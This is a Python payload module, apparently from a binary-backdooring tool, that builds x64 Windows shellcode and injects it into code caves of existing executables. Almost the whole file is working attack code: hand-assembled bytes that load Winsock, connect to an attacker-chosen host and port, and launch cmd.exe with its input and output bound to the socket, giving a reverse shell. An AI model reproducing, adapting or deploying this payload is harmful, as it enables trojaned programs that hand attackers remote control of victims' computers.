import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)

class iat_reverse_tcp_inline():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_inline"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')

        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             , 'iso-8859-1')
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress']
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # no encoders for this payload
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()



    def run(self):
        """
        Position dependent shellcode that uses API thunks of LoadLibraryA and
        GetProcAddress to find and load APIs for callback to C2.
        """
        
        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False


        self.shellcode1 = b"\xfc"   # CLD
        self.shellcode1 += b"\x49\xBE"           # mov value below to r14
        #Think about putting the LOADLIBA and GETPROCADDRESS in rX regs

        if self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        #RDX holds entry point
        self.shellcode1 += b"\x49\x01\xD6"  # add r14 + RDX
        self.shellcode1 += b"\x49\xBF"  # mov value below to r15
        if self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x49\x01\xD7"  # add r15 + RDX
        #LoadLibraryA in r14
        #GetProcAddress in r15

        '''
        Winx64 asm calling convention
        RCX, RDX, R8, R9 for the first four integer or pointer arguments (in that order),
        and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments
        are pushed onto the stack (right to left). Integer return values (similar to x86) are
        returned in RAX if 64 bits or less. Floating point return values are returned in XMM0.
        Parameters less than 64 bits long are not zero extended; the high bits are not zeroed.

        The caller reserves space on the stack (unlike x86)
        rbx
        rbp
        r12
        r13
        r14: LoadLibraryA
        r15: GetProcAddress

        '''

        self.shellcode1 += bytes("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            , 'iso-8859-1')
        self.shellcode1 += struct.pack('!H', int(self.PORT))
        self.shellcode1 += common.pack_ip_addresses(self.HOST)
        self.shellcode1 += bytes("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);
                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8
                            , 'iso-8859-1')
        #socket is in r12

        #breakupvar is the distance between codecaves
        

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"  # JMP opcode
            #breakupvar is the distance between codecaves
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)

        self.shellcode2 = bytes("\xeb\x09"                                        # jump over kernel32
                           "\x6b\x65\x72\x6e\x65\x6c\x33\x32\x00"           # kernel32,00
                           "\x48\x8D\x0D\xF0\xFF\xFF\xFF"                   # lea rcx, [rip-4]
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\x16"                                   # call qword ptr [r14]
                           # getprocaddress CreateProcessA
                           "\x49\x89\xC5"                                   # mov r13, rax ; mov kernel32 to r13
                           "\x48\x89\xC1"                                   # mov rcx, rax
                           "\xeb\x0f"                                       # jump over CreateProcessA,0
                           "\x43\x72\x65\x61\x74\x65\x50"                   # CreateProcessA
                           "\x72\x6f\x63\x65\x73\x73\x41\x00"               # ...
                           "\x48\x8D\x15\xEA\xFF\xFF\xFF"                   # lea rdx, [rip - 22]
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr CreateProcessA
                           # CreateProcessesA in rax
                           "\x48\x89\xC7"                                   # mov rdi, rax ;mov CreateProcessA to rdi
                           "\x49\x87\xFC"                                   # xchg r12, rdi (socket handle for CreateProcessA)
                           # socket is in rdi
                           # shell:
                           "\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00"       # mov r8, 'cmd'
                           "\x41\x50"                                       # push r8                     ; an extra push for alignment
                           "\x41\x50"                                       # push r8                     ; push our command line: 'cmd',0
                           "\x48\x89\xe2"                                   # mov rdx, rsp                ; save a pointer to the command line
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdError
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdOutput
                           "\x57"                                           # push rdi                    ; our socket becomes the shells hStdInput
                           "\x4d\x31\xc0"                                   # xor r8, r8                  ; Clear r8 for all the NULL's we need to push
                           "\x6a\x0d"                                       # push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
                           "\x59"                                           # pop rcx                     ; Set RCX for the loop
                           # 1 push_loop:                    ;
                           "\x41\x50"                                       # push r8                     ; push a null qword
                           "\xe2\xfc"                                       # loop push_loop              ; keep looping untill we have pushed enough nulls
                           "\x66\xc7\x44\x24\x54\x01\x01"                   # mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
                           "\x48\x8d\x44\x24\x18"                           # lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
                           "\xc6\x00\x68"                                   # mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
                           "\x48\x89\xe6"                                   # mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure
                           #   ; 1 perform the call to CreateProcessA
                           "\x56"                                           # push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
                           "\x50"                                           # push rax                    ; Push the pointer to the STARTUPINFO Structure
                           "\x41\x50"                                       # push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
                           "\x41\x50"                                       # push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
                           "\x41\x50"                                       # push r8                     ; We dont specify any dwCreationFlags
                           "\x49\xff\xc0"                                   # inc r8                      ; Increment r8 to be one
                           "\x41\x50"                                       # push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
                           "\x49\xff\xc8"                                   # dec r8                      ; Decrement r8 (third param) back down to zero
                           "\x4d\x89\xc1"                                   # mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                                                                            #                             ; r8 = lpProcessAttributes (NULL)
                                                                            #                             ; rdx = the lpCommandLine to point to "cmd",0
                           "\x4c\x89\xc1"                                   # mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\xD4"                                   # call r12                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
                           # perform the call to WaitForSingleObject
                           "\xeb\x14"                                       # jmp over WaitForSingleObject
                           "\x57\x61\x69\x74\x46\x6f\x72\x53"               # WaitForSingleObject
                           "\x69\x6e\x67\x6c\x65\x4f\x62\x6a"               # ...
                           "\x65\x63\x74\x00"                               # ...
                           "\x48\x8D\x15\xE5\xFF\xFF\xFF"                   # lea rdx, [rip-27]
                           "\x4C\x89\xE9"                                   # mov rcx, r13 ; mov kernel32 handle to rcx
                           "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                           "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WaitForSingleObject
                           # WaitForSingleObject is in rax
                           "\x48\x31\xd2"                                   # xor rdx, rdx
                           "\x8b\x0e"                                       # mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
                           "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                           "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                           #Fix Up rsp
                           "\x48\x81\xC4\x50\x01\x00\x00"                   # add rsp, 0x150 
                           , 'iso-8859-1')
        
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore
